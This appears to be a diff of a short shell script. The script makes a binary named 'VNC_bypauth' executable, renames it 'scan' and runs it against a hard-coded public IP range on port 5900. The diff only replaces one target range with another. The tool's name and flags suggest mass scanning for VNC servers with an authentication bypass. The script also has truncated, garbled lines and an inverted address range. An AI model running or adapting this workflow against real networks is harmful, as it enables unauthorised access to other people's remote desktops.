@@ -9,6 +9,6 @@ chmod +x VNC_bypauth
 mv VNC_bypauth scan
 ./sca
 ./
-./scan -i 45.197.231.234-69.103.113.5 -p 5900 -vnc -v -s 1000
-./scan -i 45.197.231.234-69.103.113.5 -p 5900 -vnc -v -s 1000
+./scan -i 184.20.84.235-79.39.28.77 -p 5900 -vnc -v -s 1000
+./scan -i 184.20.84.235-79.39.28.77 -p 5900 -vnc -v -s 1000
 exit
